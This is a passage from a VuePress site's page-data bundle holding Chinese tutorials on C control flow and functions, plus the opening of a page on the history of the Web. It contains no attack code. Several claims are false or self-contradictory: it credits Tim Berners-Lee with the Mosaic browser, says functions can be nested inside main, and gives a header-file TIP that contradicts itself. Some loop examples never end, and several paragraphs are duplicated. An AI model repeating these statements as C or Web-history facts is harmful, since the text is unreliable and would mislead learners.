{\n    max = b;\n} else {\n    max = a;\n}\n\n\n * 嵌套分支结构\n\nif (条件表达式1) {\n    if (条件表达式2) {\n        程序段1;\n    } else {\n        程序段2;\n    }\n} else {\n    程序段3;\n}\n\n//示例\n\nif (a > b) {\n    if (a > c) {\n        max = a;\n    } else {\n        max = c;\n    }\n} else {\n    if (b > c) {\n        max = b;\n    } else {\n        max = c;\n    }\n}\n\n\n * 三目运算符\n\n表达式1 ? 表达式2 : 表达式3\n\n//示例\nmax = (a > b) ? a : b;\n\n\n * switch 语句\n\nswitch (表达式) {\n    case 常量表达式1:\n        程序段1;\n        break;\n    case 常量表达式2:\n        程序段2;\n        break;\n    case 常量表达式3:\n        程序段3;\n        break;\n    default:\n        程序段4;\n        break;\n}\n\n//示例\n\n\n\n\n# 循环结构\n\n * while 循环\n\n> while 循环是先判断条件是否成立，如果成立则执行循环体，执行完循环体后再次判断条件是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\nwhile (条件表达式) {\n    程序段;\n}\n\n//示例\n\nwhile (a > b) {\n    max = a;\n}\n\n\n * do-while 循环\n\n> do-while 循环是先执行循环体，执行完循环体后再判断条件是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\n\ndo {\n    程序段;\n} while (条件表达式);\n\n//示例\n\ndo {\n    max = a;\n} while (a > b);\n\n\n * for 循环\n\n> for 循环是先执行表达式1，然后判断表达式2是否成立，如果成立则执行循环体，执行完循环体后再执行表达式3，然后再判断表达式2是否成立，如果成立则再次执行循环体，直到条件不成立时，循环结束。\n\nfor (表达式1; 表达式2; 表达式3) {\n    程序段;\n}\n\n//示例\n\nfor (i = 0; i < 10; i++) {\n    sum += i;\n}\n\n\n\n# 跳转语句\n\n * break 语句\n\n> break 语句用于强制退出循环，不执行循环体中剩余的语句。\n\nbreak;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    break;\n}\n\n\n * continue 语句\n\n> continue 语句用于强制退出循环，不执行循环体中剩余的语句，但是会继续执行下一次循环。\n\ncontinue;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    continue;\n}\n\n\n * goto 语句\n\n> goto 语句用于无条件跳转到指定的标号处执行。\n\ngoto 标号;\n\n//示例\n\nwhile (a > b) {\n    max = a;\n    goto end;\n}\nend:\n\n",charsets:{cjk:!0}},{title:"函数",frontmatter:{},regularPath:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/04-%E5%87%BD%E6%95%B0.html",relativePath:"数据结构/C语言程序设计/04-函数.md",key:"v-43166de5",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/04-%E5%87%BD%E6%95%B0.html",headers:[{level:2,title:"函数",slug:"函数",normalizedTitle:"函数",charIndex:2},{level:2,title:"函数的定义",slug:"函数的定义",normalizedTitle:"函数的定义",charIndex:347},{level:2,title:"函数的调用",slug:"函数的调用",normalizedTitle:"函数的调用",charIndex:856},{level:2,title:"函数参数",slug:"函数参数",normalizedTitle:"函数参数",charIndex:1432},{level:3,title:"形式参数",slug:"形式参数",normalizedTitle:"形式参数",charIndex:387},{level:3,title:"引用调用",slug:"引用调用",normalizedTitle:"引用调用",charIndex:1923},{level:3,title:"传值调用",slug:"传值调用",normalizedTitle:"传值调用",charIndex:1865},{level:2,title:"函数的返回值",slug:"函数的返回值",normalizedTitle:"函数的返回值",charIndex:400},{level:3,title:"返回值类型",slug:"返回值类型",normalizedTitle:"返回值类型",charIndex:394},{level:3,title:"返回指针",slug:"返回指针",normalizedTitle:"返回指针",charIndex:4020},{level:2,title:"函数的递归调用",slug:"函数的递归调用",normalizedTitle:"函数的递归调用",charIndex:4520},{level:2,title:"函数的声明",slug:"函数的声明",normalizedTitle:"函数的声明",charIndex:4848},{level:2,title:"main 函数 exit 函数",slug:"main-函数-exit-函数",normalizedTitle:"main 函数 exit 函数",charIndex:5575},{level:2,title:"多文件编程",slug:"多文件编程",normalizedTitle:"多文件编程",charIndex:6299},{level:3,title:"头文件",slug:"头文件",normalizedTitle:"头文件",charIndex:6477},{level:3,title:"头文件的引用",slug:"头文件的引用",normalizedTitle:"头文件的引用",charIndex:6609},{level:3,title:"头文件的保护",slug:"头文件的保护",normalizedTitle:"头文件的保护",charIndex:6931}],headersStr:"函数 函数的定义 函数的调用 函数参数 形式参数 引用调用 传值调用 函数的返回值 返回值类型 返回指针 函数的递归调用 函数的声明 main 函数 exit 函数 多文件编程 头文件 头文件的引用 头文件的保护",content:'# 函数\n\n> C程序的基本组成部分是函数，每个C程序都有一个主函数main()，所有的函数都是由main()开始调用的。函数是一组一起执行一个任务的语句。每个C程序都至少有一个函数，即主函数main()，所有简单的程序都可以定义其他额外的函数。您可以把代码划分到不同的函数中。如何划分代码到不同的函数中是由您来决定的，但在逻辑上，划分通常是根据每个函数执行一个特定的任务来进行的。\n\n从函数定义的角度来看，C程序可分为两大部分：\n\n * 主函数main()：主函数是每个程序必须有的，是程序执行的入口，一般情况下，主函数不嵌套定义其他函数，但可以调用其他函数。\n\n * 其他函数：除了主函数以外的其他函数，可以嵌套定义在主函数中，也可以定义在主函数外面，但必须在主函数调用之前定义。\n\n\n# 函数的定义\n\n> 函数定义包括函数头和函数体两部分。\n\n * 函数头：由函数名、形式参数列表、返回值类型和函数的返回值组成。\n\n * 函数体：由一条或多条C语句组成，它们定义了函数的功能。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("Max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# 函数的调用\n\n> C语言中的函数调用很简单，您只需要声明函数，定义函数以及调用函数即可。当程序调用函数时，程序控制权会转移给被调用的函数。被调用的函数执行已定义的代码，当函数的返回语句被执行时，或到达函数的结束括号时，会把程序控制权交还给主程序。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 函数参数\n\n> 如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的形式参数。形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。\n\n * 形式参数：函数定义中的参数，用于接收调用该函数时传递给它的值。形式参数在函数被调用时被赋值，退出函数后被销毁。\n\n * 实际参数：函数调用时传递给函数的值，被称为实际参数。实际参数是在调用函数时产生的。\n\n * 形式参数和实际参数的区别：形式参数只有在被调用时才分配内存单元，在调用结束时，即刻释放所分配的内存单元。因此，形式参数只有在函数内部有效。函数调用结束返回主调函数后则不能再使用该形式参数变量。实际参数可以是常量、变量、表达式、函数等，无论实际参数是何种类型的量，在进行函数调用时，它们都必须有确定的值，以便把这些值传送给形式参数。\n\n\n# 形式参数\n\n> 形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。当调用函数时，有两种向函数传递参数的方式：\n\n * 传值调用：该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数对实际参数没有影响。\n\n * 引用调用：通过指针传递方式，形参为指向实参地址的指针，当形参发生改变时，实参也发生改变。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 引用调用\n\n> C语言中，引用调用函数的实例，把一个变量的地址传递给函数，那么它就可以在函数中修改这个变量的值。这个例子使用了引用调用来交换两个数。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 传值调用\n\n> C语言中，传值调用函数的实例，把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数对实际参数没有影响。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int x, int y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(a, b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int x, int y) {\n\n    int temp;\n\n    temp = x;    //保存地址x的值\n    x = y;    //把y赋值给x\n    y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 函数的返回值\n\n> C语言中，函数的返回值是函数执行完成后返回到主程序的值。C语言中，函数的返回值只能是一个，如果要返回多个值，只能通过指针的方式来实现。\n\n\n# 返回值类型\n\n> 函数返回值的类型，可以是任意的数据类型，包括基本类型和结构类型。当函数返回一个值时，它必须使用return语句。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("Max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# 返回指针\n\n> C语言中，函数的返回值可以是指针类型，但是不能返回一个局部变量的地址，因为局部变量在函数返回后会被释放掉。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint *getRandom();\n\nint main() {\n\n    //一个指向整数的指针\n    int *p;\n\n    p = getRandom();\n\n    for (int i = 0; i < 10; ++i) {\n        printf("*(p + %d) : %d\\n", i, *(p + i));\n    }\n\n    return 0;\n}\n\n//函数返回随机数\n\nint *getRandom() {\n\n    static int r[10];\n\n    //设置种子\n    srand((unsigned) time(NULL));\n\n    for (int i = 0; i < 10; ++i) {\n        r[i] = rand();\n        printf("%d\\n", r[i]);\n    }\n\n    return r;\n}\n\n\n\n# 函数的递归调用\n\n> C语言中，函数的递归调用是指在一个函数的函数体内调用函数自身。函数的递归调用是合法的，但是要注意不要造成死循环。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint factorial(int i);\n\nint main() {\n\n    int i = 5;\n    printf("%d 的阶乘是 %d\\n", i, factorial(i));\n\n    return 0;\n}\n\n//函数定义\n\nint factorial(int i) {\n\n    if (i <= 1) {\n        return 1;\n    }\n\n    return i * factorial(i - 1);\n}\n\n\n\n# 函数的声明\n\n> C语言中，函数的声明是指在函数调用之前告诉编译器函数的名称、返回值类型和参数的类型。函数的声明可以在函数的定义之前或之后，如果在函数定义之前，那么函数的定义必须在函数调用之前。\n\nTIP\n\n * 函数的声明只是告诉编译器函数的名称、返回值类型和参数的类型，函数的定义才是真正实现函数功能的地方。\n * 函数的声明可以在函数的定义之前或之后，如果在函数定义之前，那么函数的定义必须在函数调用之前。\n * 函数的声明可以多次，但是函数的定义只能有一次。\n * 函数的声明和函数的定义必须保持一致，否则会报错。\n * 函数的声明和函数的定义可以分别写在不同的文件中，但是函数的声明和函数的定义必须在同一个文件中。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("Max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# main 函数 exit 函数\n\n> 在main函数中调用exit和return结果是一样的, 在子函数中调用exit和return结果是不一样的。exit函数是在stdlib.h中定义的，它的原型为： void exit(int status); 。exit函数的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。exit函数的功能是终止当前正在执行的程序，它可以在任何地方调用，包括main函数中，它的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。exit函数的功能是终止当前正在执行的程序，它可以在任何地方调用，包括main函数中，它的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid func1();\n\nint main() {\n\n    printf("调用函数 func1 前...\\n");\n\n    func1();\n\n    printf("调用函数 func1 后...\\n");\n\n    return 0;\n}\n\n//函数定义\n\nvoid func1() {\n\n    printf("进入函数 func1 ...\\n");\n\n    printf("调用 exit() 函数...\\n");\n\n    exit(0);\n\n    printf("退出函数 func1 ...\\n");\n}\n\n\n\n# 多文件编程\n\n> C语言中，多文件编程是指把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。C语言中，多文件编程的好处是可以把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。C语言中，多文件编程的好处是可以把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。\n\n\n# 头文件\n\n> C语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。C语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。C语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。\n\n\n# 头文件的引用\n\n> C语言中，头文件的引用是指在源文件中使用#include指令包含头文件，#include指令的格式为： #include <filename> 或 #include "filename" 。\n\n\n#include <stdio.h>\n\n#include "max.h"\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("Max value is : %d\\n", ret);\n\n    return 0;\n}\n\n\n\n# 头文件的保护\n\n> C语言中，头文件的保护是指在头文件中使用条件编译指令，防止头文件被重复引用\n\n\n#ifndef MAX_H\n\n#define MAX_H\n\nint max(int num1, int num2);\n\n#endif\n',normalizedContent:'# 函数\n\n> c程序的基本组成部分是函数，每个c程序都有一个主函数main()，所有的函数都是由main()开始调用的。函数是一组一起执行一个任务的语句。每个c程序都至少有一个函数，即主函数main()，所有简单的程序都可以定义其他额外的函数。您可以把代码划分到不同的函数中。如何划分代码到不同的函数中是由您来决定的，但在逻辑上，划分通常是根据每个函数执行一个特定的任务来进行的。\n\n从函数定义的角度来看，c程序可分为两大部分：\n\n * 主函数main()：主函数是每个程序必须有的，是程序执行的入口，一般情况下，主函数不嵌套定义其他函数，但可以调用其他函数。\n\n * 其他函数：除了主函数以外的其他函数，可以嵌套定义在主函数中，也可以定义在主函数外面，但必须在主函数调用之前定义。\n\n\n# 函数的定义\n\n> 函数定义包括函数头和函数体两部分。\n\n * 函数头：由函数名、形式参数列表、返回值类型和函数的返回值组成。\n\n * 函数体：由一条或多条c语句组成，它们定义了函数的功能。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# 函数的调用\n\n> c语言中的函数调用很简单，您只需要声明函数，定义函数以及调用函数即可。当程序调用函数时，程序控制权会转移给被调用的函数。被调用的函数执行已定义的代码，当函数的返回语句被执行时，或到达函数的结束括号时，会把程序控制权交还给主程序。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 函数参数\n\n> 如果函数要使用参数，则必须声明接受参数值的变量。这些变量称为函数的形式参数。形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。\n\n * 形式参数：函数定义中的参数，用于接收调用该函数时传递给它的值。形式参数在函数被调用时被赋值，退出函数后被销毁。\n\n * 实际参数：函数调用时传递给函数的值，被称为实际参数。实际参数是在调用函数时产生的。\n\n * 形式参数和实际参数的区别：形式参数只有在被调用时才分配内存单元，在调用结束时，即刻释放所分配的内存单元。因此，形式参数只有在函数内部有效。函数调用结束返回主调函数后则不能再使用该形式参数变量。实际参数可以是常量、变量、表达式、函数等，无论实际参数是何种类型的量，在进行函数调用时，它们都必须有确定的值，以便把这些值传送给形式参数。\n\n\n# 形式参数\n\n> 形式参数就像函数内的其他局部变量，在进入函数时被创建，退出函数时被销毁。当调用函数时，有两种向函数传递参数的方式：\n\n * 传值调用：该方法把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数对实际参数没有影响。\n\n * 引用调用：通过指针传递方式，形参为指向实参地址的指针，当形参发生改变时，实参也发生改变。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 引用调用\n\n> c语言中，引用调用函数的实例，把一个变量的地址传递给函数，那么它就可以在函数中修改这个变量的值。这个例子使用了引用调用来交换两个数。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int *x, int *y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(&a, &b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int *x, int *y) {\n\n    int temp;\n\n    temp = *x;    //保存地址x的值\n    *x = *y;    //把y赋值给x\n    *y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 传值调用\n\n> c语言中，传值调用函数的实例，把参数的实际值复制给函数的形式参数。在这种情况下，修改函数内的形式参数对实际参数没有影响。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid swap(int x, int y);\n\nint main() {\n\n    //局部变量定义\n    int a = 100;\n    int b = 200;\n\n    printf("交换前，a的值：%d\\n", a);\n    printf("交换前，b的值：%d\\n", b);\n\n    //调用函数来交换值\n    swap(a, b);\n\n    printf("交换后，a的值：%d\\n", a);\n    printf("交换后，b的值：%d\\n", b);\n\n    return 0;\n}\n\n//函数定义\n\nvoid swap(int x, int y) {\n\n    int temp;\n\n    temp = x;    //保存地址x的值\n    x = y;    //把y赋值给x\n    y = temp;    //把temp赋值给y\n\n    return;\n}\n\n\n\n# 函数的返回值\n\n> c语言中，函数的返回值是函数执行完成后返回到主程序的值。c语言中，函数的返回值只能是一个，如果要返回多个值，只能通过指针的方式来实现。\n\n\n# 返回值类型\n\n> 函数返回值的类型，可以是任意的数据类型，包括基本类型和结构类型。当函数返回一个值时，它必须使用return语句。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# 返回指针\n\n> c语言中，函数的返回值可以是指针类型，但是不能返回一个局部变量的地址，因为局部变量在函数返回后会被释放掉。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint *getrandom();\n\nint main() {\n\n    //一个指向整数的指针\n    int *p;\n\n    p = getrandom();\n\n    for (int i = 0; i < 10; ++i) {\n        printf("*(p + %d) : %d\\n", i, *(p + i));\n    }\n\n    return 0;\n}\n\n//函数返回随机数\n\nint *getrandom() {\n\n    static int r[10];\n\n    //设置种子\n    srand((unsigned) time(null));\n\n    for (int i = 0; i < 10; ++i) {\n        r[i] = rand();\n        printf("%d\\n", r[i]);\n    }\n\n    return r;\n}\n\n\n\n# 函数的递归调用\n\n> c语言中，函数的递归调用是指在一个函数的函数体内调用函数自身。函数的递归调用是合法的，但是要注意不要造成死循环。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint factorial(int i);\n\nint main() {\n\n    int i = 5;\n    printf("%d 的阶乘是 %d\\n", i, factorial(i));\n\n    return 0;\n}\n\n//函数定义\n\nint factorial(int i) {\n\n    if (i <= 1) {\n        return 1;\n    }\n\n    return i * factorial(i - 1);\n}\n\n\n\n# 函数的声明\n\n> c语言中，函数的声明是指在函数调用之前告诉编译器函数的名称、返回值类型和参数的类型。函数的声明可以在函数的定义之前或之后，如果在函数定义之前，那么函数的定义必须在函数调用之前。\n\ntip\n\n * 函数的声明只是告诉编译器函数的名称、返回值类型和参数的类型，函数的定义才是真正实现函数功能的地方。\n * 函数的声明可以在函数的定义之前或之后，如果在函数定义之前，那么函数的定义必须在函数调用之前。\n * 函数的声明可以多次，但是函数的定义只能有一次。\n * 函数的声明和函数的定义必须保持一致，否则会报错。\n * 函数的声明和函数的定义可以分别写在不同的文件中，但是函数的声明和函数的定义必须在同一个文件中。\n\n\n#include <stdio.h>\n\n//函数声明\n\nint max(int num1, int num2);\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("max value is : %d\\n", ret);\n\n    return 0;\n}\n\n//函数返回两个数中较大的那个数\n\nint max(int num1, int num2) {\n\n    //局部变量声明\n    int result;\n\n    if (num1 > num2)\n        result = num1;\n    else\n        result = num2;\n\n    return result;\n}\n\n\n\n# main 函数 exit 函数\n\n> 在main函数中调用exit和return结果是一样的, 在子函数中调用exit和return结果是不一样的。exit函数是在stdlib.h中定义的，它的原型为： void exit(int status); 。exit函数的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。exit函数的功能是终止当前正在执行的程序，它可以在任何地方调用，包括main函数中，它的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。exit函数的功能是终止当前正在执行的程序，它可以在任何地方调用，包括main函数中，它的作用是终止当前正在执行的程序，status是一个整数，用来表示程序的终止状态，一般来说，0表示程序正常终止，非0表示程序的异常终止。\n\n\n#include <stdio.h>\n\n//函数声明\n\nvoid func1();\n\nint main() {\n\n    printf("调用函数 func1 前...\\n");\n\n    func1();\n\n    printf("调用函数 func1 后...\\n");\n\n    return 0;\n}\n\n//函数定义\n\nvoid func1() {\n\n    printf("进入函数 func1 ...\\n");\n\n    printf("调用 exit() 函数...\\n");\n\n    exit(0);\n\n    printf("退出函数 func1 ...\\n");\n}\n\n\n\n# 多文件编程\n\n> c语言中，多文件编程是指把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。c语言中，多文件编程的好处是可以把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。c语言中，多文件编程的好处是可以把程序分成多个文件，每个文件都可以单独编译，然后再把它们连接起来生成可执行文件。\n\n\n# 头文件\n\n> c语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。c语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。c语言中，头文件是指包含函数声明、宏定义和类型定义的文件，头文件的扩展名是.h。\n\n\n# 头文件的引用\n\n> c语言中，头文件的引用是指在源文件中使用#include指令包含头文件，#include指令的格式为： #include <filename> 或 #include "filename" 。\n\n\n#include <stdio.h>\n\n#include "max.h"\n\nint main() {\n\n    //局部变量声明\n    int a = 100;\n    int b = 200;\n    int ret;\n\n    //调用函数来获取最大值\n    ret = max(a, b);\n\n    printf("max value is : %d\\n", ret);\n\n    return 0;\n}\n\n\n\n# 头文件的保护\n\n> c语言中，头文件的保护是指在头文件中使用条件编译指令，防止头文件被重复引用\n\n\n#ifndef max_h\n\n#define max_h\n\nint max(int num1, int num2);\n\n#endif\n',charsets:{cjk:!0}},{title:"Web发展史",frontmatter:{},regularPath:"/web/web%E4%BB%8B%E7%BB%8D/Web%E5%8F%91%E5%B1%95%E5%8F%B2.html",relativePath:"web/web介绍/Web发展史.md",key:"v-67e2281f",path:"/web/web%E4%BB%8B%E7%BB%8D/Web%E5%8F%91%E5%B1%95%E5%8F%B2.html",headers:[{level:2,title:"世界性的信息库",slug:"世界性的信息库",normalizedTitle:"世界性的信息库",charIndex:83},{level:2,title:"Web诞生",slug:"web诞生",normalizedTitle:"web诞生",charIndex:339},{level:3,title:"万维网",slug:"万维网",normalizedTitle:"万维网",charIndex:379},{level:3,title:"W3C",slug:"w3c",normalizedTitle:"w3c",charIndex:672},{level:3,title:"网页从学术机构走向公众社会",slug:"网页从学术机构走向公众社会",normalizedTitle:"网页从学术机构走向公众社会",charIndex:1212},{level:2,title:"Web社会影响",slug:"web社会影响",normalizedTitle:"web社会影响",charIndex:1435},{level:2,title:"Web行业的发展趋势",slug:"web行业的发展趋势",normalizedTitle:"web行业的发展趋势",charIndex:1692},{level:3,title:"Web行业的发展动力",slug:"web行业的发展动力",normalizedTitle:"web行业的发展动力",charIndex:1707},{level:3,title:"H5 就是一个最好的例子",slug:"h5-就是一个最好的例子",normalizedTitle:"h5 就是一个最好的例子",charIndex:1848},{level:3,title:"未来软件的特点",slug:"未来软件的特点",normalizedTitle:"未来软件的特点",charIndex:1998},{level:3,title:"未来只有两种软件工程师",slug:"未来只有两种软件工程师",normalizedTitle:"未来只有两种软件工程师",charIndex:2079}],headersStr:"世界性的信息库 Web诞生 万维网 W3C 网页从学术机构走向公众社会 Web社会影响 Web行业的发展趋势 Web行业的发展动力 H5 就是一个最好的例子 未来软件的特点 未来只有两种软件工程师",content:"# Web发展史\n\n> 读史以明鉴,知古以鉴今!\n\n时至今日，Web发展从有到无，从简到繁，随着时间的推移，Web发展也越来越快，对于人类的影响也越来越大！\n\n\n# 世界性的信息库\n\n20世纪40年代以来，人们就梦想能拥有一个世界性的信息库。在这个信息库中，信息不仅能被全球的人们存取，而且能轻松地链接到其他地方的信息，使用户可以方便快捷地获得重要的信息。\n\nGopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，但在WWW出现后，Gopher失去了昔日的辉煌。\n\n\n# Web诞生\n\n> 1990年可以看做Web开发历史的起点。\n\n * 1990年，万维网之父蒂姆·伯纳斯·李（Tim Berners-Lee）开发出了第一个网页浏览器Mosaic，随即很多出色的程序员加入了网页浏览器开发的行列；\n * 1991年8月6日，由蒂姆·伯纳斯·李建立的全世界第一个万维网网站上线。\n * 1993年4月30日，欧洲核子研究组织宣布万维网对任何人免费开放，并不收取任何费用。两个月之后Gopher宣布不再免费，造成大量用户从Gopher转向万维网。\n * 1994年10月13日，网景公司开发的浏览器Mosaic Netscape 0.9发布；\n * 